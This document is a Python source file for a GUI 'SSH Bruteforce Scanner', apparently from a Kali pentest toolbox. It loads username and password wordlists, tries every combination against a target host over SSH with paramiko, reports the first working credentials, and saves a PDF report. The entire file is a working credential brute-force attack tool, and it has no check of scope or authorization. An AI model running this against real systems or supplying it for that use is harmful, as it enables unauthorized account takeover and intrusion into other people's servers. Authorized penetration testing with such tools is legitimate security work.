import tkinter as tk
from tkinter import filedialog, messagebox
from tkinter.scrolledtext import ScrolledText
import paramiko
from tqdm import tqdm
import time
import os
import socket
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas

def read_file(file_path):
    with open(file_path, "r") as file:
        content = file.read().splitlines()
    return content

def ssh_bruteforce(host, port, username_list, password_list, delay=1):
    results = []
    for username in username_list:
        for password in tqdm(password_list, desc=f"Trying {username}"):
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(hostname=host, port=port, username=username, password=password, timeout=10)
                success_message = f"[+] Login successful! Username: {username}, Password: {password}"
                print(success_message)
                results.append(success_message)
                ssh.close()
                return (username, password), results
            except paramiko.AuthenticationException:
                continue
            except (paramiko.SSHException, socket.timeout, paramiko.ssh_exception.SSHException) as e:
                error_message = f"[-] SSHException occurred: {e}"
                print(error_message)
                results.append(error_message)
                time.sleep(delay)
                continue
            except Exception as e:
                error_message = f"[-] An error occurred: {e}"
                print(error_message)
                results.append(error_message)
                time.sleep(delay)
                continue
    results.append("[-] Bruteforce unsuccessful.")
    print("[-] Bruteforce unsuccessful.")
    return None, results

def generate_pdf(report_data, host, directory="/home/kali/Documents/ToolsBox/compte_rendu/ssh_brutforce"):
    if not os.path.exists(directory):
        os.makedirs(directory)
    filename = f"{directory}/{host}_bruteforce_report.pdf"
    c = canvas.Canvas(filename, pagesize=letter)
    text = c.beginText(40, 750)
    text.setFont("Helvetica", 12)
    text.textLine(f"SSH Bruteforce Report for {host}")
    text.textLine("----------------------------")
    for line in report_data:
        text.textLine(line)
    c.drawText(text)
    c.save()
    return filename

def scan_ssh():
    host = entry_host.get()
    if not host:
        messagebox.showwarning("Warning", "Please enter a valid IP address or hostname.")
        return

    username_file = entry_username.get()
    password_file = entry_password.get()
    if not username_file or not password_file:
        messagebox.showwarning("Warning", "Please select both username and password files.")
        return

    usernames = read_file(username_file)
    passwords = read_file(password_file)

    result, results = ssh_bruteforce(host, 22, usernames, passwords)

    if result:
        username, password = result
        text_area.insert(tk.END, f"[+] Bruteforce successful! Username: {username}, Password: {password}\n")
    else:
        text_area.insert(tk.END, "[-] Bruteforce unsuccessful.\n")

    pdf_path = generate_pdf(results, host)
    messagebox.showinfo("Report Generated", f"Report saved at: {pdf_path}")
    return_to_menu()

def return_to_menu():
    root.destroy()
    import subprocess
    subprocess.call(["python3", "toolbox_menu1.py"])

root = tk.Tk()
root.title("SSH Bruteforce Scanner")
root.geometry("800x600")

entry_label_host = tk.Label(root, text="Enter IP address or hostname:")
entry_label_host.pack(pady=10)
entry_host = tk.Entry(root, width=50)
entry_host.pack()

def select_username_file():
    file_path = filedialog.askopenfilename(title="Select username file", filetypes=[("Text files", "*.txt")])
    entry_username.delete(0, tk.END)
    entry_username.insert(0, file_path)

btn_select_username = tk.Button(root, text="Select username file", command=select_username_file)
btn_select_username.pack(pady=5)

entry_label_username = tk.Label(root, text="Username file:")
entry_label_username.pack()
entry_username = tk.Entry(root, width=50)
entry_username.pack()

def select_password_file():
    file_path = filedialog.askopenfilename(title="Select password file", filetypes=[("Text files", "*.txt")])
    entry_password.delete(0, tk.END)
    entry_password.insert(0, file_path)

btn_select_password = tk.Button(root, text="Select password file", command=select_password_file)
btn_select_password.pack(pady=5)

entry_label_password = tk.Label(root, text="Password file:")
entry_label_password.pack()
entry_password = tk.Entry(root, width=50)
entry_password.pack()

scan_button = tk.Button(root, text="Scan", command=scan_ssh)
scan_button.pack(pady=10)

text_area = ScrolledText(root, wrap=tk.WORD, width=80, height=20)
text_area.pack(padx=10, pady=10)

root.mainloop()
